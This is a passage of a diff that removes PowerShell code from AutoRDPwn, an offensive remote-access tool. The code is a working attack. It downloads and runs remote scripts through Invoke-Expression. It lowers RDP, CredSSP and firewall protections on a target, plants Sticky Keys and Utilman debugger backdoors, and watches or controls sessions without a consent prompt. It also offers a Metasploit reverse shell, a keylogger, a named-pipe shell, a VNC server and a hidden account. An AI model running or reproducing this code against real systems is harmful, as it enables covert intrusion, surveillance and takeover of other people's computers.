-        ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-        
-        if($forensics -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; if ($local){ Import-Module .\Resources\Scripts\SessionGopher.ps1 } else { 
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/SessionGopher.ps1')}
-        Invoke-SessionGopher -Thorough | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($forensics -like 'X'){ $input = 'x' ; continue }
-        if($forensics -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-        
-        if($module -like '5') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
-        Write-Host "     $txt111" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Reverse Shell" -ForegroundColor Gray
-        Write-Host "     $txt112" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Keylogger" -ForegroundColor Gray
-        Write-Host "     $txt113" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
-        
-        if($backdoor -like '1') { $sticky = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($backdoor -like '2') { $metasploit = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 
-        $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
-        & $question ; Write-Host "$txt65" -NoNewLine -ForegroundColor Gray ; $metahost = $Host.UI.ReadLine() ; Write-Host
-        & $question ; Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $metaport = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        Write-Host ; Write-Host "[!] $txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/handler"
-        Write-host "set payload windows/shell/reverse_tcp" ; Write-host "set LHOST $metahost" ; Write-host "set LPORT $metaport"  
-        Write-host "exploit" ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($backdoor -like '3') { $getkeys = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-        if($backdoor -like 'X'){ $input = 'x' ; continue }
-        if($backdoor -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($module -like '6') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt70" -ForegroundColor Gray
-        Write-Host "     $txt114" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt71" -ForegroundColor Gray
-        Write-Host "     $txt115" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt72" -ForegroundColor Gray
-        Write-Host "     $txt116" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $privesc = $Host.UI.ReadLine() ; Write-Host
-
-        if($privesc -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        if ($local){ Import-Module .\Resources\Scripts\Chachi-Enumerator.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Chachi-Enumerator.ps1')}
-        Comprueba-Todo ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-        
-        if($privesc -like '2'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        if ($local){ Import-Module .\Resources\Scripts\Sherlock.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Sherlock.ps1')}
-        Find-AllVulns ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-        
-        if($privesc -like '3'){ Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
-        if ($local){ Import-Module .\Resources\Scripts\Invoke-PrivescCheck.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PrivescCheck.ps1')}
-        Invoke-PrivescCheck ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-        
-        if($privesc -like 'X'){ $input = 'x' ; continue }
-        if($privesc -in '1','2','3','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($module -like '7') { Show-Banner
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
-        Write-Host "     $txt117" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt62" -ForegroundColor Gray
-        Write-Host "     $txt118" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt67" -ForegroundColor Gray
-        Write-Host "     $txt119" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt79" -ForegroundColor Gray
-        Write-Host "     $txt120" -ForegroundColor DarkGray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
-        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
-        Write-Host ; Write-Host "[" -NoNewLine ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine
-        $Random = New-Object System.Random ; "$txt8" -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(8))}
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; $othermodule = $Host.UI.ReadLine() ; Write-Host
-
-        if($othermodule -like '1') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-        if ($local){ Import-Module .\Resources\Scripts\Invoke-Phant0m.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')}
-        Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-        
-        if($othermodule -like '2'){ $vncserver = "true" ; Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-        
-        if($othermodule -like '3') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Write-Host
-        do { & $question ; Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
-        if(!$externalscript) { Write-Host "[!] $txt6" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 600 }}
-        until ( $externalscript) ; & $question ; Write-Host "$txt74" -NoNewLine -ForegroundColor Gray ; $externalfunction = $Host.UI.ReadLine() 
-        $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-        if($externalscript -like 'http*') { Invoke-Expression (New-Object Net.WebClient).DownloadString("$externalscript") } 
-        else { Import-Module $externalscript } ; if($externalfunction){ Invoke-Expression $externalfunction }
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host "[i] " -nonewline ; pause ; Start-Sleep -milliseconds 600 }
-
-        if($othermodule -like '4') { Write-Host "[i] $txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 600 ; Set-Location $env:temp
-        Write-Host ; & $question ; Write-Host "$txt78" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $user = $Host.UI.ReadLine() ; if(!$user) { [Console]::SetCursorPosition(0,"$cursortop")
-        & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser ; $user = $currentuser }
-        do { Write-Host ; & $question ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
-        $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ( $PlainTextPassword )
-        Write-Host ; Write-Host "[+] $txt80" -ForegroundColor Blue ; Start-Sleep -milliseconds 600 ; if ($local){ Import-Module .\Resources\Scripts\Invoke-RunAs.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-RunAs.ps1')}
-        Add-Type -AssemblyName System.DirectoryServices.AccountManagement ; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:computername)
-        $validate = $obj.ValidateCredentials($user, $PlainTextPassword) ; if ($validate -eq $true ){ Write-Host ; Write-Host "[i] $txt82" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-        if ($local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Start-Process powershell -NoNewWindow -WorkingDirectory $localpath -ArgumentList $PSCommandPath $args" ; del ./RunAs.exe ; exit }}
-        if (!$local) { ./RunAs.exe -u $user -p $PlainTextPassword -e "powershell Invoke-WebRequest -UseBasicParsing https://darkbyte.net/autordpwn.php -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1" ; del ./RunAs.exe ; exit }
-        else { Write-Host ; Write-Host "[!] $txt81" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; del ./RunAs.exe }}
-
-        if($othermodule -like 'X'){ $input = 'x' ; continue }
-        if($othermodule -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        if($module -like 'X'){ $input = 'x' ; continue } ; if($module -in '1','2','3','4','5','6','7','m','x') { $null }
-        else { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}
-
-        'X' { continue }
-        default { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }}} until ($input -in '1','2','3','4','5','6','7','X')
-
-   if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
-   $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -force ; Set-Item wsman:\localhost\client\trustedhosts * -Force
-   Set-NetConnectionProfile -InterfaceIndex ((Get-NetConnectionProfile).interfaceindex) -NetworkCategory Private ; $i = 0 ; do { $i++ ; if(!$user) {
-   $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; Start-Sleep -milliseconds 500 } until ($session -or $i -eq 10) ; if ($session){ $attack = "true"
-
-        do { $seeshadow = "see", "ver", "regarder", "siehe", "vedere", "увидеть" ; $controlshadow = "control", "controlar", "contrôle", "kontrolle", "controllo", "контроль"
-        $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$shadowval }
-        else { if($hash){ $user = $null } ; Write-Host ; & $question ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $inputoption = $Host.UI.ReadLine()}
-
-        if($inputoption -in $seeshadow) { $control = "false" ; Write-Host
-        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
-        Write-Host "[+] $using:txt30" -ForegroundColor Blue }}
-
-        if($inputoption -in $controlshadow) { $control = "true" ; Write-Host
-        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
-        Write-Host "[+] $using:txt31" -ForegroundColor Blue }}
-
-        if($inputoption -in $stickyshadow) { $control = "true" ; Write-Host
-        Write-Host "[+] $txt34" -ForegroundColor Blue }
-
-        if(!$control) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }} until ($control)
-
-    $prevAllowRPC = invoke-command -session $RDP[0] -scriptblock {
-    $AllowAnonymousCallback = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM").AllowAnonymousCallback
-    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\WBEM\CIMOM" -Name AllowAnonymousCallback -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $DisableRestrictedAdmin = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").DisableRestrictedAdmin
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force 2>&1> $null
-    $AutoShareWks = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters").AutoShareWks
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name AutoShareWks -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $AutoShareServer = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters").AutoShareServer
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name AutoShareServer -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $AllowRemoteRPC = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server").AllowRemoteRPC
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name AllowRemoteRPC -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $fDenyTSConnections = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections -Value 0 -PropertyType DWORD -Force 2>&1> $null
-    $fAllowToGetHelp = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance").fAllowToGetHelp
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name fAllowToGetHelp -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $fAllowFullControl = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance").fAllowFullControl
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name fAllowFullControl -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    $SecurityLayer = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").SecurityLayer
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name SecurityLayer -Value 0 -PropertyType DWORD -Force 2>&1> $null
-    $UserAuthentication = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp").UserAuthentication
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication -Value 0 -PropertyType DWORD -Force 2>&1> $null
-    $LocalAccountTokenFilterPolicy = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").LocalAccountTokenFilterPolicy
-    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -PropertyType DWORD -Force 2>&1> $null
-    Enable-NetFirewallRule -Name 'RemoteDesktop-Shadow-In-TCP' 2>&1> $null
-    if(!(Get-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In')) { New-NetFirewallRule -Name 'AutoRDPwn-TermService-RPC-In' -DisplayName 'AutoRDPwn TermService RPC' -Direction Inbound -Action Allow -Program 'C:\Windows\System32\svchost.exe' -Service TermService -Protocol TCP -Profile Any 2>&1> $null }
-    $AllowRemoteRPC }
-    $AllowEncryptionOracle = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters").AllowEncryptionOracle
-    New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Name AllowEncryptionOracle -Value 2 -PropertyType DWORD -Force 2>&1> $null
-
-    Write-Host ; Write-Host "[+] $txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
-    Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
-    if($user -and $PlainTextPassword -and !$hash){ cmdkey /add:$computer /user:$user /pass:$PlainTextPassword 2>&1> $null }
-    $version = invoke-command -session $RDP[0] -scriptblock { (Get-CimInstance -ClassName Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-
-    if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
-    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-PipeShell.ps1')
-    Invoke-PipeShell -mode server -aeskey AutoRDPwn_AESKey -server localhost -Pipe "NamedPipeStream" } 2>&1> $null }}
-
-    if($vncserver){ $base64 = if ($local){ Get-Content .\Resources\Scripts\Invoke-VNCServer.ps1 } else {
-    (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')}
-    invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
-    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
-    Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
-        
-    if ($sticky){ invoke-command -session $RDP[0] -scriptblock {
-    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
-    New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" -Name Debugger -Value "powershell.exe -noexit ; clear" -PropertyType String -Force 2>&1> $null
-    New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name LogonTimeout -Value 3600 -PropertyType DWord -Force 2>&1> $null }}
-
-    if(!$prevAllowRPC){ Write-Host ; Write-Host "[i] $txt86" -ForegroundColor Green ; Start-Sleep -milliseconds 600
-    invoke-command -session $RDP[0] -scriptblock { Restart-Computer -Force } 2>&1> $null ; Start-Sleep -seconds 60
-    $j = 0 ; do { $j++ ; Start-Sleep -milliseconds 3000 ; if($user){ $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate 2>&1> $null } else { $RDP = New-PSSession -Computer $computer -Authentication Negotiate 2>&1> $null } } until ($RDP -or $j -eq 30) }
-
-        if($version -Like '*Server*') { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$sticky) { invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
-        (Get-CimInstance -ClassName Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
-        Write-Host ; Write-Host "[+] $using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session } ; $Host.UI.RawUI.ForegroundColor = 'Green'
-        do { Write-Host ; & $question ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine() ; if(!$shadow){ Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 }
-        elseif($shadow -notmatch '^\d+$') { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; $shadow = $null }} until ($shadow)}
-
-        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
-        if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
-        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
-        qwinsta /server:$computer 2>&1> $null
-        if($LASTEXITCODE -eq 0) {
-        if($control -eq 'true') { if($sticky){ mstsc /v:$computer /admin /f } elseif (!$user){ mstsc /v:$computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v:$computer /admin /shadow:$shadow /control /noconsentprompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v:$computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v:$computer /admin /shadow:$shadow /noconsentprompt /f } } } else { Write-Host "[!] $txt87" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; mstsc /v:$computer /admin /f } } }}
-
-        else { Write-Host "[!] $version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
-        if($local){ Import-Module .\Resources\Scripts\Invoke-RDPwrap.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')}
-        invoke-command -session $RDP[0] -scriptblock { Set-Content -Path Setup.msi -Value $using:RDPWrap -Encoding Byte 
-        msiexec /i "Setup.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null ; del .\Setup.msi
-        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
-        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
-        attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; if (Get-Process msiexec -ErrorAction SilentlyContinue) { Wait-Process -Name msiexec -Timeout 60 } ; rm .\Setup.msi 2>&1> $null }}
-
-        if(!$sticky) { $shadow = invoke-command -session $RDP[0] -scriptblock { (Get-Process explorer).SessionId | Sort-Object | Select-Object -Last 1 } ; Write-Host ; Write-Host "[+] $txt35" -ForegroundColor Blue ; Start-Sleep -milliseconds 600 } ; if(!$shadow){ $shadow = 1 }
-        if($OSVersion -like 'Unix'){ if(!$user){ rdesktop $computer -u $user } else {  rdesktop $computer -u $user -p $password }}
-        if(!$nogui){ if($vncserver){ if($local){ Import-Module .\Resources\Scripts\Invoke-VNCViewer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')}
-        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer -disablesponsor -nostatus -notoolbar -autoscaling -nocursor }} else {
-        qwinsta /server:$computer 2>&1> $null
-        if($LASTEXITCODE -eq 0) {
-        if($control -eq 'true') { if($sticky){ mstsc /v:$computer /admin /f } elseif (!$user){ mstsc /v:$computer /admin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v:$computer /admin /shadow:$shadow /control /noconsentprompt /f }}
-        if($control -eq 'false') { if(!$user){ mstsc /v:$computer /admin /shadow:$shadow /noconsentprompt /f } else { mstsc /v:$computer /admin /shadow:$shadow /noconsentprompt /f } } } else { Write-Host "[!] $txt87" -ForegroundColor Red ; Start-Sleep -milliseconds 600 ; mstsc /v:$computer /admin /f } } }}
-
-$Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
-if ($nogui){ $remotehost = $env:computername.tolower() ; Write-Host "[+] $txt66" ; Write-Host ; Write-Host "mstsc /v:$remotehost /admin /shadow:$shadow /control /noconsentprompt /f" ; Write-Host
-if ($createuser -like '-createuser') { $hash = "true" ; invoke-command -session $RDP[0] -scriptblock { powershell.exe -windowstyle hidden $using:Pwn5 }}}
-else { Write-Host "[i] $txt38" -ForegroundColor Green ; Start-Sleep -milliseconds 600 }
-
-if ($hash){ invoke-command -session $RDP[0] -scriptblock {
-$script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
-echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
-$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
-
-if ($webserver){ if($local){ Import-Module .\Resources\Scripts\Start-WebServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/Resources/Scripts/Start-WebServer.ps1')}
-invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Web Server" 2>&1> $null
